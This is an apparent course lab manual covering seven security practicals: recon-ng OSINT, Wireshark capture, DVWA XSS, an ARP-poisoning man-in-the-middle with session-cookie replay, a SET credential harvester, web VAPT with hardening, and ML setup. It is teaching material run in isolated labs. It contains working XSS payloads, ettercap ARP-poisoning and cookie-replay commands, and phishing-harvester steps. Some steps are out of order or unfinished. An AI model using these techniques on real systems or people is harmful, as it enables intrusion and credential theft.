@@ -1,0 +1,1026 @@
+PRACTICAL 1 — RECONNAISSANCE AND OSINT GATHERING
+PLATFORM: Kali Linux Terminal; Recon-ng Console; Browser
+A) Prepare & Configure Kali Linux
+Check OS info
+cat /etc/os-release
+Check kernel info
+uname -a
+Update package index
+sudo apt update
+Install recon-ng
+sudo apt install -y recon-ng
+Verify install
+which recon-ng
+Check Python3 version
+python3 –version 
+if not installled then sudo apt install -g python3
+B) Create Practical Workspace
+Make a folder
+mkdir -p ~/Security-Attacks-Practical/Practical-01
+Enter it
+cd ~/Security-Attacks-Practical/Practical-01
+Start logging the whole terminal session
+script -a session-log.txt
+Save a label
+echo "recon-ng Practical Environment" | tee -a tool-versions.txt
+Save recon-ng version
+recon-ng --version | tee -a tool-versions.txt
+Save OS name
+cat /etc/os-release | head -n 2 | tee -a versions.txt
+C) Initialize recon-ng & Explore
+Launch
+recon-ng
+See all commands
+help
+Browse modules
+modules search
+D) Workspace Management & Module Install
+Install every marketplace module
+marketplace install all
+List workspaces
+workspaces list
+Create a dedicated workspace
+workspaces create security-breaches
+Confirm it was created
+workspaces list
+Install the whois module
+marketplace install recon/domains-contacts/whois_pocs
+E) OSINT: WHOIS POC Discovery
+Load the module
+modules load recon/domains-contacts/whois_pocs
+Set the target
+options set SOURCE facebook.com
+Run it
+run
+See results
+show contacts
+F) Cross-Platform Username Search
+ACTION: 1. Install namechk module
+Load it
+modules load recon/domains-profiles/namechk Tip: if a module path 404s, run marketplace search <module_name> to find its current path — paths change between recon-ng releases.
+Set target name
+options set SOURCE Brandon Stout
+Run
+run
+Go back to the workspace
+back
+Insert target domains into the DB
+db insert tesla.com then db insert bmw.com
+Verify
+show domains
+Observe profiles
+show profiles
+G) Database Operations & Host Enumeration
+Insert a domain into DB
+db insert domains
+Display domains table
+show domains
+Search host-enum modules
+modules search host
+Load hackertarget module
+modules load recon/domains-hosts/hackertarget
+Set source
+options set SOURCE tesla.com
+Run
+run
+Show discovered hosts
+show hosts
+H) Reporting — HTML Report
+Query DB
+db query select * from domains
+Load the HTML report module
+modules load reporting-html
+View its options
+info
+Set creator
+set CREATOR Arv
+Set customer
+set CUSTOMER car world
+Set output path
+set FILENAME /home/kali/Security-Attacks-Practical/Practical-01/result.html
+Run it
+run
+Open the report in browser
+firefox-esr /home/kali/Security-Attacks-Practical/Practical-01/result.html
+Exit recon-ng
+exit
+Stop session logging (run exit again, this time in the outer shell)
+exit
+PRACTICAL 2 — PACKET SNIFFING AND PROTOCOL ANALYSIS USING WIRESHARK
+PLATFORM: Kali Linux Terminal; Wireshark GUI; Browser
+A) Install & Configure Wireshark
+Check Kali version
+cat /etc/os-release
+Update packages
+sudo apt update
+Install tools
+sudo apt install -y wireshark tshark tcpdump curl python3 openssl netcat-openbsd libcap2-bin
+Allow non-root packet capture (choose Yes when prompted)
+sudo dpkg-reconfigure wireshark-common
+Add your user to the wireshark group
+sudo usermod -aG wireshark $USER
+Verify group membership
+id -nG
+getcap /usr/bin/dumpcap
+
+Check versions
+wireshark --version | head -n 3
+tshark --version | head -n 3
+dumpcap --version | head -n 3
+List capture interfaces
+dumpcap -D
+B) Prepare the Isolated Lab
+Create evidence folders
+mkdir -p ~/security-labs/practical-03/{captures,www,tls,notes}
+Enter the folder
+cd ~/security-labs/practical-03
+Confirm path
+pwd
+ACTION: 4. Create www/login.html with this content
+
+<!doctype html>
+<html lang=”en”>
+<head><meta charset=”utf-8”><title>Wireshark Lab</title></head>
+<body>
+<h1>Local HTTP Demonstration </h1>
+<p>This page uses dummy data only.</p>
+</body>
+</html>
+
+
+
+
+Verify the file
+cat www/login.html
+Check lab ports 8080/8443/9999 are free
+ss -lntup | grep -E ':(8080|8443|9999)\b' || echo "Ports 8080, 8443 and 9999 are available"
+C) Understand the Wireshark Interface
+Start Wireshark (normal user)
+wireshark &
+ACTION: 2. In the GUI, find the Loopback: lo interface — don't double-click it yet
+D) Capture & Analyze ICMP Traffic
+ACTION: 1. In Wireshark, double-click Loopback: lo to start capturing.
+In a new terminal, generate ICMP traffic
+ping -c 4 127.0.0.1
+ACTION: 3. Back in Wireshark, click the red Stop square once ping finishes.
+ACTION: 4. Filter the capture: type icmp in the display-filter bar, Enter.
+Click one ICMP packet
+ACTION: expand Internet Protocol Version 4 and Internet Control Message Protocol to see Source/Destination Address, ICMP Type, ICMP Code, Identifier, Sequence Number.
+Save the capture
+ACTION: File ▸ Save As.
+E) Capture TCP and Cleartext HTTP Traffic
+In the Practical-03 folder, start a local HTTP server
+python3 -m http.server 8080 --bind 127.0.0.1 --directory www
+ACTION: 2. In another terminal, open Wireshark ▸ Capture ▸ Options, select only Loopback: lo, set Capture Filter to tcp port 8080, press Enter/Start.
+In a third terminal, generate traffic
+curl -v "http://127.0.0.1:8080/login.html?username=student&password=LabDemo123"
+ACTION: 4. Stop the Wireshark capture.
+ACTION: 5. Expand a request to see TCP SYN, SYN-ACK, ACK, HTTP GET, HTTP 200 OK, and connection teardown.
+ACTION: 6. Find the TCP 3-way handshake: filter tcp.flags.syn == 1
+ACTION: 7. Show only HTTP requests: filter http.request.
+ACTION: 8. Search for the dummy password: filter http.request.uri contains "LabDemo123".
+Right-click the GET request
+Follow ▸ TCP Stream to see the full exchange.
+ACTION: 10. Save capture as http-cleartext-capture.pcapng.
+F) Capture a UDP Datagram
+Start a UDP listener
+nc -u -l -s 127.0.0.1 -p 9999
+ACTION: 2. In Wireshark, select Loopback: lo, filter udp port 9999, start capturing.
+In another terminal, send a UDP message
+printf "UDP Message\n" | nc -u -w 1 127.0.0.1 9999
+ACTION: 4. Save capture as UDP.
+G) Compare HTTPS/TLS with Cleartext HTTP
+ACTION: 1. Go to the tls folder
+Generate a self-signed cert
+openssl req -x509 -newkey rsa:2048 -nodes -keyout lab.key -out lab.crt -days 1 -subj "/CN=localhost"
+Verify files
+ls -l lab.key lab.crt
+Start a local TLS server
+openssl s_server -quiet -accept 8443 -cert lab.crt -key lab.key -www
+ACTION: 5. In Wireshark, start capturing with filter tcp port 8443.
+Generate HTTPS traffic
+curl -k -v https://127.0.0.1:8443/
+ACTION: 7. Stop capture, filter tls to view only TLS packets. Expand Client Hello.
+Try to find the dummy password in cleartext: filter frame contains "LabDemo123"
+expect 0 matches
+ACTION: 9. Save as tls.capture.pcapng.
+H) Analyze Capture Statistics
+ACTION: 1. Statistics ▸ Protocol Hierarchy
+ACTION: 2. Statistics ▸ Endpoints
+ACTION: 3. Statistics ▸ Flow Graph
+I) Save & Validate Evidence
+List capture files
+ls -lh captures/
+Inspect metadata
+capinfos captures/http-cleartext-capture.pcapng
+Extract HTTP fields with TShark
+tshark -r captures/http-cleartext-capture.pcapng -Y 'http.request' -T fields -e frame.number -e ip.src -e tcp.srcport -e http.request.method -e http.host -e http.request.uri
+Create checksums
+sha256sum captures/*.pcapng | tee notes/SHA256SUMS.txt
+J) Optional: Command-Line Capture with TShark
+Capture for 15 seconds
+tshark -i lo -f 'tcp port 8080' -a duration:15 -w captures/http-cli-capture.pcapng
+Read it back
+tshark -r captures/http-cli-capture.pcapng -Y http.request -T fields -e http.request.method -e http.host -e http.request.uri
+HTML FILE — www/login.html (create from Practical-02 folder)
+cat > www/login.html <<'HTML'
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Wireshark Lab</title></head>
+<body>
+<h1>Local HTTP Demonstration</h1>
+<p>This page uses dummy laboratory data only.</p>
+</body>
+</html>
+HTML
+PRACTICAL 3 — BROWSER AND INJECTION ATTACKS
+PLATFORM: Kali Linux Terminal; Docker; Firefox/Browser
+A) Prepare & Configure Kali Linux
+Update
+sudo apt update
+Install deps
+sudo apt install -y docker.io docker-compose git curl firefox-esr
+Enable Docker
+sudo systemctl enable --now docker
+Check service status
+sudo systemctl status docker --no-pager
+Check versions
+docker --version
+docker-compose --version
+firefox-esr --version
+git --version
+B) Create Practical Workspace
+Make folders
+mkdir -p ~/security-attacks/practical-05/{evidence,screenshots}
+Enter it
+cd ~/security-attacks/practical-05
+Confirm path
+pwd
+Start session recording
+script -a evidence/terminal-session.txt
+Save tool versions
+{ date; docker --version; docker compose --version; firefox-esr --version; git --version; } | tee evidence/tool-versions.txt
+C) Install & Configure DVWA (Docker)
+Clone DVWA
+git clone https://github.com/digininja/DVWA.git
+cd DVWA
+Record the exact commit
+git rev-parse HEAD | tee ../evidence/dvwa-commit.txt
+Confirm it binds to loopback only
+grep -A2 "ports:" compose.yml
+Pull images
+sudo docker compose pull
+Start containers
+sudo docker compose up -d
+Check status
+sudo docker compose ps
+Verify reachability
+curl -I http://127.0.0.1:4280/
+D) Initialize & Log In to DVWA
+Open Firefox
+firefox-esr http://127.0.0.1:4280/ >/dev/null 2>&1 &
+ACTION: 2. Go to http://127.0.0.1:4280/setup.php and click Create / Reset Database, then log in
+ACTION: 3. Go to DVWA Security, select Low, click Submit.
+E) Reflected XSS
+ACTION: 1. Open XSS
+ACTION: 2. Enter any name, click submit once to see the normal reflection.
+Submit the payload
+<script>alert('Reflected-XSS')</script>
+ACTION: 4. Observe the alert box pop up and inspect the resulting URL
+Open DevTools (F12)
+Network/Elements tab to inspect the injected request/response.
+F) Stored XSS
+ACTION: 1. Open XSS
+ACTION: 2. Enter a normal guestbook entry first
+Submit a payload entry
+Name: student, Message: <script>alert('Stored-XSS')</script>
+ACTION: 4. Reload the page
+ACTION: 5. Clear the guestbook when done
+G) DOM-Based XSS
+ACTION: 1. Open XSS
+ACTION: 2. Enter this URL directly in the address bar: http://127.0.0.1:4280/vulnerabilities/xss_d/?default=English<script>alert('DOM-XSS')</script>
+ACTION: 3. Compare View Page Source
+ACTION: 4. Note Source = document.location.href
+H) Defensive Fix for XSS
+ACTION: 1. Go to DVWA Security ▸ select Impossible ▸ Submit.
+Re-try the Reflected payload <script>alert('Reflected-XSS')</script>
+it's now shown as plain text, not executed.
+Re-try the Stored payload the same way in the Message field
+again shown as inert text, proving output-encoding fixed it.
+PRACTICAL 4 — MAN-IN-THE-MIDDLE (MITM)
+PLATFORM: Kali Linux Terminal; isolated network namespaces; Ettercap; TShark/Wireshark
+A) Prepare & Configure Kali Linux
+OS info
+cat /etc/os-release | grep PRETTY_NAME
+Update
+sudo apt update
+Install tools
+sudo DEBIAN_FRONTEND=noninteractive apt install -y nmap ettercap-text-only tshark curl openssl python3
+Check versions
+nmap --version | sed -n '1p'
+ettercap -v
+tshark --version | sed -n '1p'
+python3 --version
+B) Build the Isolated Lab Network
+Create 3 namespaces
+sudo ip netns add attacker
+sudo ip netns add victim
+sudo ip netns add server
+Create the bridge
+sudo ip link add br-lab type bridge then sudo ip link set br-lab up
+Create veth pairs
+sudo ip link add veth-att type veth peer name att0, sudo ip link add veth-vic type veth peer name vic0, sudo ip link add veth-srv type veth peer name srv0
+Move each peer into its namespace
+sudo ip link set att0 netns attacker, sudo ip link set vic0 netns victim, sudo ip link set srv0 netns server
+Attach host-side ends to the bridge
+sudo ip link set veth-att master br-lab, sudo ip link set veth-vic master br-lab, sudo ip link set veth-srv master br-lab
+Bring bridge-side links up
+sudo ip link set veth-att up, sudo ip link set veth-vic up, sudo ip link set veth-srv up
+Configure attacker ns
+sudo ip netns exec attacker ip link set lo up, sudo ip netns exec attacker ip link set att0 up, sudo ip netns exec attacker ip addr add 10.10.20.10/24 dev att0
+Configure victim ns
+same 3 commands with victim/vic0/10.10.20.20/24
+Configure server ns
+same 3 commands with server/srv0/10.10.20.30/24
+Verify addresses
+sudo ip netns exec attacker ip -br addr
+Test connectivity
+sudo ip netns exec victim ping -c 2 10.10.20.30, sudo ip netns exec attacker nmap -sn -n 10.10.20.20 10.10.20.30
+C) Create the Session-Lab Teaching Server
+Create session_lab_server.py (full code included below)
+cat <<'EOF' > session_lab_server.py
+Check syntax
+python3 -m py_compile session_lab_server.py
+D) Test the HTTP Session Flow (No Interception)
+Start server in HTTP mode (own terminal, leave running)
+sudo ip netns exec server python3 "$PWD/session_lab_server.py" --host 10.10.20.30 --port 8000
+Log in as victim
+sudo ip netns exec victim curl -sS -D - -o /dev/null -c /tmp/victim.cookies -d 'username=student&password=lab123' http://10.10.20.30:8000/login
+Access account page with the saved cookie
+sudo ip netns exec victim curl -sS -b /tmp/victim.cookies http://10.10.20.30:8000/account
+View the cookie jar
+sudo cat /tmp/victim.cookies
+Replay the stolen cookie as the attacker
+sudo ip netns exec attacker curl -sS -H 'Cookie: LABSESSID=<value from victim.cookies>' http://10.10.20.30:8000/account
+Log out as victim
+sudo ip netns exec victim curl -sS -b /tmp/victim.cookies http://10.10.20.30:8000/logout
+Replay the same cookie again as attacker
+same command as step 5 — now it's rejected
+E) ARP Poisoning and HTTP Traffic Capture (you build this part)
+Remove any old capture
+sudo rm -f /tmp/session_http.pcap
+Start ARP poisoning + capture
+sudo ip netns exec attacker ettercap -T -q -i att0 -M arp /10.10.20.20// /10.10.20.30// -w /tmp/session_http.pcap
+In another terminal, generate victim traffic
+sudo ip netns exec victim curl -sS -b /tmp/victim.cookies http://10.10.20.30:8000/account
+Stop ettercap (Ctrl+C), then extract the captured cookie
+sudo tshark -r /tmp/session_http.pcap -Y 'http.set_cookie' -T fields -E header=y -e ip.src -e ip.dst -e http.request.uri -e http.cookie
+Compare against
+cat /tmp/victim.cookies
+Replay as attacker
+sudo ip netns exec attacker curl -sS -H 'Cookie: LABSESSID=<token>' http://10.10.20.30:8000/account
+Log out, then confirm the replay now fails
+repeat steps similar to Part D, steps 6–7.
+F) Generate a Lab TLS Certificate
+Make certs folder
+mkdir -p certs
+Create a local CA
+openssl req -x509 -newkey rsa:2048 -nodes -keyout certs/lab_ca.key -out certs/lab_ca.crt -days 1 -sha256 -subj '/CN=Session Lab CA'
+Create server key + CSR
+openssl req -newkey rsa:2048 -nodes -keyout certs/server.key -out certs/server.csr -subj '/CN=session.lab'
+cat > certs/server.ext <<'EOF'
+subjectAltName=DNS:session.lab,IP:10.10.20.30
+extendedKeyUsage=serverAuth
+EOF
+Create certs/server.ext
+cat > certs/server.ext <<'EOF' then subjectAltName=DNS:session.lab,IP:10.10.20.30 and extendedKeyUsage=serverAuth, then EOF
+Sign the server cert with the lab CA
+openssl x509 -req -in certs/server.csr -CA certs/lab_ca.crt -CAkey certs/lab_ca.key -CAcreateserial -out certs/server.crt -days 1 -sha256 -extfile certs/server.ext
+Verify it
+openssl x509 -in certs/server.crt -noout -subject -issuer -ext subjectAltName
+G) Test the HTTPS Session Flow (No Interception)
+Start server in HTTPS mode (own terminal)
+sudo ip netns exec server python3 "$PWD/session_lab_server.py" --https --host 10.10.20.30 --port 8443 --cert "$PWD/certs/server.crt" --key "$PWD/certs/server.key"
+Log in over HTTPS
+sudo ip netns exec victim curl -sS --cacert "$PWD/certs/lab_ca.crt" -D - -o /dev/null -c /tmp/victim_sec.cookies -d 'username=student&password=lab123' https://10.10.20.30:8443/login — note Set-Cookie now carries Secure; HttpOnly plus a Strict-Transport-Security header.
+Access account page
+sudo ip netns exec victim curl -sS --cacert "$PWD/certs/lab_ca.crt" -b /tmp/victim_sec.cookies https://10.10.20.30:8443/account
+H) Inspect the Captured HTTP Traffic in Wireshark
+Open the capture
+wireshark /tmp/session_http.pcap &
+ACTION: 2. Filter arp to see the ARP-poisoning packets, or http.cookie to see the cleartext stolen cookie.
+I/J) (Build yourself, following the pattern of E–H: repeat the ARP-poison capture against the HTTPS server/port 8443 and show that tls-filtered packets hide the cookie, while an http-filtered capture on port 8000 exposes it in plaintext.)
+L) Clean Up the Lab Environment
+Remove namespaces
+sudo ip netns del attacker >/dev/null 2>&1 || true
+Remove the bridge
+sudo ip link del br-lab >/dev/null 2>&1 || true
+Remove captures
+sudo rm -f /tmp/session_http.pcap /tmp/session_https.pcap
+Remove cookie files
+sudo rm -f /tmp/victim.cookies /tmp/victim_sec.cookies
+Remove certs
+sudo rm -rf certs
+Confirm nothing remains
+ip netns list
+Practical 04, Part C — session_lab_server.py
+#!/usr/bin/env python3
+"""Deliberately simple local session-lab web server.
+
+For isolated classroom use only. It supports two modes:
+ * HTTP (insecure cookie attributes) for observing session exposure.
+ * HTTPS (Secure/HttpOnly/SameSite cookie + HSTS header) for comparison.
+"""
+
+from __future__ import annotations
+
+import argparse
+import html
+import http.cookies
+import http.server
+import secrets
+import ssl
+import urllib.parse
+from typing import Dict
+
+SESSIONS: Dict[str, str] = {}
+USERNAME = "student"
+PASSWORD = "lab123"
+
+
+class SessionLabHandler(http.server.BaseHTTPRequestHandler):
+    server_version = "SessionLab/1.0"
+
+    def _send(self, status: int, body: str, *, content_type: str = "text/html; charset=utf-8", headers=None):
+        data = body.encode("utf-8")
+        self.send_response(status)
+        self.send_header("Content-Type", content_type)
+        self.send_header("Content-Length", str(len(data)))
+        self.send_header("Cache-Control", "no-store")
+        if getattr(self.server, "secure_mode", False):
+            self.send_header("Strict-Transport-Security", "max-age=300")
+        if headers:
+            for key, value in headers:
+                self.send_header(key, value)
+        self.end_headers()
+        self.wfile.write(data)
+
+    def _session_user(self):
+        raw = self.headers.get("Cookie", "")
+        jar = http.cookies.SimpleCookie()
+        try:
+            jar.load(raw)
+        except http.cookies.CookieError:
+            return None
+        morsel = jar.get("LABSESSID")
+        if not morsel:
+            return None
+        return SESSIONS.get(morsel.value)
+
+    def do_GET(self):
+        path = urllib.parse.urlsplit(self.path).path
+        if path == "/":
+            user = self._session_user()
+            if user:
+                body = f"""<!doctype html><title>Session Lab</title>
+                <h1>Session Lab</h1><p>Logged in as <b>{html.escape(user)}</b>.</p>
+                <p><a href='/account'>Open account page</a> | <a href='/logout'>Logout</a></p>"""
+            else:
+                scheme = "HTTPS" if getattr(self.server, "secure_mode", False) else "HTTP"
+                body = f"""<!doctype html><title>Session Lab</title>
+                <h1>Session Lab - {scheme}</h1>
+                <p>Dummy classroom credentials: <code>{USERNAME}</code> / <code>{PASSWORD}</code></p>
+                <form method='post' action='/login'>
+                 <label>Username <input name='username'></label><br>
+                 <label>Password <input name='password' type='password'></label><br>
+                 <button type='submit'>Login</button>
+                </form>"""
+            self._send(200, body)
+            return
+
+        if path == "/account":
+            user = self._session_user()
+            if not user:
+                self._send(401, "Not authenticated\n", content_type="text/plain; charset=utf-8")
+                return
+            self._send(200, f"Authenticated session for {user}\n", content_type="text/plain; charset=utf-8")
+            return
+
+        if path == "/logout":
+            raw = self.headers.get("Cookie", "")
+            jar = http.cookies.SimpleCookie()
+            try:
+                jar.load(raw)
+                morsel = jar.get("LABSESSID")
+                if morsel:
+                    SESSIONS.pop(morsel.value, None)
+            except http.cookies.CookieError:
+                pass
+            attrs = "Path=/; Max-Age=0; SameSite=Lax"
+            if getattr(self.server, "secure_mode", False):
+                attrs += "; Secure; HttpOnly"
+            self._send(200, "Logged out\n", content_type="text/plain; charset=utf-8",
+                       headers=[("Set-Cookie", f"LABSESSID=deleted; {attrs}")])
+            return
+
+        self._send(404, "Not found\n", content_type="text/plain; charset=utf-8")
+
+    def do_POST(self):
+        path = urllib.parse.urlsplit(self.path).path
+        if path != "/login":
+            self._send(404, "Not found\n", content_type="text/plain; charset=utf-8")
+            return
+
+        length = int(self.headers.get("Content-Length", "0"))
+        body = self.rfile.read(length).decode("utf-8", errors="replace")
+        form = urllib.parse.parse_qs(body, keep_blank_values=True)
+        username = form.get("username", [""])[0]
+        password = form.get("password", [""])[0]
+        if username != USERNAME or password != PASSWORD:
+            self._send(403, "Invalid lab credentials\n", content_type="text/plain; charset=utf-8")
+            return
+
+        token = secrets.token_hex(16)
+        SESSIONS[token] = username
+        attrs = "Path=/; SameSite=Lax"
+        if getattr(self.server, "secure_mode", False):
+            attrs += "; Secure; HttpOnly"
+        headers = [
+            ("Set-Cookie", f"LABSESSID={token}; {attrs}"),
+            ("Location", "/account"),
+        ]
+        self._send(302, "Login successful\n", content_type="text/plain; charset=utf-8", headers=headers)
+
+    def log_message(self, fmt, *args):
+        print(f"[{self.address_string()}] {fmt % args}")
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Local isolated session-hijacking teaching server")
+    parser.add_argument("--host", default="0.0.0.0")
+    parser.add_argument("--port", type=int, default=8000)
+    parser.add_argument("--https", action="store_true", help="Enable TLS and secure cookie attributes")
+    parser.add_argument("--cert", help="Server certificate PEM for --https")
+    parser.add_argument("--key", help="Server private key PEM for --https")
+    args = parser.parse_args()
+
+    if args.https and (not args.cert or not args.key):
+        parser.error("--https requires --cert and --key")
+
+    server = http.server.ThreadingHTTPServer((args.host, args.port), SessionLabHandler)
+    server.secure_mode = args.https
+
+    scheme = "https" if args.https else "http"
+    if args.https:
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(certfile=args.cert, keyfile=args.key)
+        server.socket = context.wrap_socket(server.socket, server_side=True)
+
+    print(f"Session Lab server listening on {scheme}://{args.host}:{args.port}")
+    print(f"Dummy credentials: {USERNAME} / {PASSWORD}")
+    print("Press Ctrl+C to stop.")
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("\nStopping server.")
+    finally:
+        server.server_close()
+
+
+if __name__ == "__main__":
+    main()
+HTTPS interception/capture comparison steps I/J: [VERIFY FROM MANUAL] — source manual/notes do not supply a complete ready-to-run procedure.
+PRACTICAL 5 — CREDENTIAL HARVESTING USING SET (SOCIAL ENGINEER TOOLKIT)
+PLATFORM: Kali Linux Terminal; SET Console; Firefox/Browser
+A) Prepare & Configure Kali Linux
+OS info
+cat /etc/os-release | sed -n '1,6p'
+Update
+sudo apt update
+Install SET
+sudo apt install -y set
+Check version
+dpkg-query -W -f='${Package}\t${Version}\n' set
+Find the launcher
+command -v setoolkit
+B) Create the Training Pages (safe, local HTML)
+Make folders
+mkdir -p ~/set-safe-lab and mkdir -p ~/set-safe-complete
+ACTION: 2. Write ~/set-safe-lab/index.html — a login form with a "LAB ONLY" warning banner and pre-filled dummy values
+ACTION: 3. Write ~/set-safe-complete/index.html — a simple "Training submission complete" confirmation page, same here-doc method.
+Confirm both exist
+ls -l ~/set-safe-lab/index.html ~/set-safe-complete/index.html
+C) Serve the Completion Page Locally
+Start a server bound to loopback only
+python3 -m http.server 8081 --bind 127.0.0.1 --directory ~/set-safe-complete
+Confirm it responds
+curl -I http://127.0.0.1:8081/
+D) Check Port 80 Before Using SET
+SET's Credential Harvester listens on port 80 by default — check it's free
+sudo ss -ltnp | grep ':80 ' || echo 'Port 80 is available'
+E) Launch SET
+Start it
+sudo setoolkit
+Choose 1) Social-Engineering Attacks
+1
+Choose 2) Website Attack Vectors
+2
+Choose 3) Credential Harvester Attack Method
+3
+F) Configure the Credential Harvester
+ACTION: 1. When prompted, choose 3) Custom Import
+Enter the IP to post back to
+your machine's IP
+127.0.0.1.
+ACTION: 3. Enter the path to the site to be cloned when asked, and choose 1 to import just the index.html file.
+Enter the URL of the completion page to redirect to
+http://127.0.0.1:8081/
+G) Submit Training Data & Capture the Report
+In Firefox, go to
+http://127.0.0.1/
+ACTION: 2. Enter the pre-filled dummy credentials and click Submit Training Data.
+ACTION: 3. Switch back to the setoolkit terminal — it prints the harvested POST parameters
+H) Observations
+I) Observation & Interpretation (write-up table to fill in)
+J) Shut Down & Clean Up
+Stop the Python server
+Ctrl+C in its terminal
+Confirm listeners are stopped
+sudo ss -ltnp | grep -E '(:80|:8081)' || echo 'Lab web listeners are stopped'
+Remove training files (optional)
+rm -rf ~/set-safe-lab ~/set-safe-complete
+If you stopped Apache earlier, restart it
+sudo systemctl start apache2
+Practical 05, Part B — ~/set-safe-lab/index.html (training login page)
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SET Training Portal</title>
+<style>
+body {font-family: Arial, sans-serif; background:#eef1f4; margin:0;}
+.card {max-width:420px; margin:70px auto; background:#fff;
+padding:28px; border:1px solid #bbb; border-radius:10px;}
+h1 {font-size:24px; margin-top:0;}
+.warning {background:#fff3cd; padding:10px; border-radius:6px;}
+label {display:block; margin-top:14px;}
+input {width:100%; padding:10px; box-sizing:border-box;}
+button {margin-top:18px; width:100%; padding:11px;}
+</style>
+</head>
+<body>
+<div class="card">
+<h1>Security Training Portal</h1>
+<p class="warning"><b>LAB ONLY:</b> Use dummy credentials. Never enter a real password.</p>
+<form action="index.html" method="post" autocomplete="off">
+<label>Training username</label>
+<input type="text" name="username" value="student01" required>
+<label>Training password</label>
+<input type="password" name="password" value="LabOnly123!" required>
+<label>Lab code</label>
+<input type="text" name="lab_code" value="SE-LAB" required>
+<button type="submit">Submit Training Data</button>
+</form>
+</div>
+</body>
+</html>
+Practical 05, Part B — ~/set-safe-complete/index.html (completion page)
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Training Complete</title></head>
+<body style="font-family:Arial;max-width:700px;margin:70px auto">
+<h1>Training submission complete</h1>
+<p>This page is part of the isolated SET familiarization laboratory.</p>
+<p>No real account has been accessed.</p>
+</body>
+</html>
+PRACTICAL 6 — VULNERABILITY ASSESSMENT AND PENETRATION TESTING (VAPT)
+PLATFORM: Kali Linux Terminal; Docker; Nmap; Nikto; curl
+A) Prepare & Configure Kali Linux
+Update
+sudo apt update
+Install tools
+sudo apt install -y docker.io docker-compose git nmap nikto curl
+Enable & start Docker
+sudo systemctl enable docker --now
+Confirm it's running
+sudo systemctl is-active docker
+B) Verify Installed Tool Versions
+docker --version
+docker compose version
+nmap --version | head -n 1
+nikto -Version 2>/dev/null | head
+curl --version | head -n 1
+C) Create the Practical Workspace
+cd ~/vapt-lab
+mkdir -p ~/vapt-lab
+Confirm
+pwd
+D) Deploy the Vulnerable Target (DVWA) in Docker
+Clone DVWA
+git clone https://github.com/digininja/DVWA.git
+cd DVWA
+Confirm loopback-only binding
+grep -A 2 -n "ports:" compose.yml
+Start containers
+sudo docker compose up -d
+Check status
+sudo docker compose ps
+Confirm listening port
+sudo ss -lntp | grep ':4280'
+E) Define Scope & Capture Baseline Evidence
+mkdir -p lab-evidence
+cd ~/vapt-lab/DVWA
+Record scope
+printf "Target: http://127.0.0.1:4280\nScope: loopback only\n" | tee lab-evidence/scope.txt
+Capture baseline headers
+curl -s -D lab-evidence/baseline_headers.txt -o /dev/null http://127.0.0.1:4280/
+View them
+cat lab-evidence/baseline_headers.txt
+F) Discovery & Vulnerability Assessment (Before Hardening)
+Nmap service discovery
+nmap -Pn -p 4280 --script http-title,http-headers 127.0.0.1 -oN lab-evidence/nmap_http.txt
+Nikto web scan
+nikto -h http://127.0.0.1:4280 -output lab-evidence/nikto_before.txt -Format txt
+Review the report
+less lab-evidence/nikto_before.txt
+G) Validate Findings Manually with curl
+Check security headers on login page
+curl -s -D - -o /dev/null http://127.0.0.1:4280/login.php | grep -Ei '(HTTP/|X-Frame-Options|Content-Security-Policy)'
+Check if phpinfo.php is exposed
+curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://127.0.0.1:4280/phpinfo.php
+Try to extract PHP version from it
+curl -s http://127.0.0.1:4280/phpinfo.php | grep -m 1 -i 'PHP Version' | sed 's/<[^>]*>//g'
+H) Remediation — Harden the Web Server
+sudo docker compose exec dvwa bash -c '
+a2enmod headers >/dev/null && \
+printf "%s\n" \
+  "<IfModule mod_headers.c>" \
+  "Header always set X-Frame-Options \"SAMEORIGIN\"" \
+  "Header always set X-Content-Type-Options \"nosniff\"" \
+  "Header always set Referrer-Policy \"no-referrer\"" \
+  "</IfModule>" \
+  > /etc/apache2/conf-available/vapt-hardening.conf && \
+a2enconf vapt-hardening >/dev/null && \
+apache2ctl configtest && \
+apache2ctl -k graceful
+'
+sudo docker compose exec dvwa mv /var/www/html/phpinfo.php /var/www/html/phpinfo.php.lab-disabled
+
+
+I) Retest After Remediation
+Re-check headers
+curl -s -D - -o /dev/null http://127.0.0.1:4280/login.php | grep -Ei '(HTTP/|X-Frame-Options|X-Content-Type-Options|Referrer-Policy)'
+Re-check phpinfo.php
+curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://127.0.0.1:4280/phpinfo.php
+Re-scan with Nikto
+nikto -h http://127.0.0.1:4280 -output lab-evidence/nikto_after.txt -Format txt
+Compare before
+echo '--- BEFORE ---'; grep -Ei 'X-Frame-Options|X-Content-Type-Options|phpinfo' lab-evidence/nikto_before.txt
+Compare after
+echo '--- AFTER ---'; grep -Ei 'X-Frame-Options|X-Content-Type-Options|phpinfo' lab-evidence/nikto_after.txt
+J) Report — Write the VAPT Report
+Open an editor
+nano lab-evidence/VAPT_Report.txt
+REPORT FIELDS: Title; Target; Authorization; Date/Time; Tester; Scope & RoE; Tools & Versions; Discovery Results; Vulnerability Assessment Results; Validated Findings; CWE/CVE/CVSS; Risk Prioritization; Remediation; Retest; Residual Risk & Conclusion.
+Save & exit nano
+Ctrl+O, Enter, Ctrl+X
+K) Clean Up the Lab
+Stop & remove containers
+sudo docker compose down
+Confirm port closed
+sudo ss -lntp | grep ':4280' || echo 'Port 4280 is not listening.'
+Also remove the DB volume
+sudo docker compose down -v
+PRACTICAL 7 — INTERPRETING MACHINE LEARNING (ML) WITH CYBERSECURITY
+PLATFORM: Kali Linux Terminal; Python virtual environment
+A) Prepare & Configure Kali Linux
+OS info
+cat /etc/os-release | head -n 3
+Python version
+python3 --version
+Update
+sudo apt update
+Install system packages
+sudo apt install -y python3-full python3-venv python3-pip unzip
+B) Prepare Workspace & Dataset
+Go to your practical folder (must already contain datasets.zip)
+cd ~/MSc-CS/Security-Attacks/Practical-07
+Extract it
+unzip datasets.zip
+List files
+ls -l
+C) Create the Python Virtual Environment
+Create it
+python3 -m venv .venv
+Activate it
+source .venv/bin/activate
+Confirm interpreter
+which python
+D) Install Python Dependencies
+Write requirements
+numpy
+pandas
+scikit-learn
+matplotlib
+EOF
+cat <<'EOF' > requirements.txt
+Install
+python -m pip install -r requirements.txt
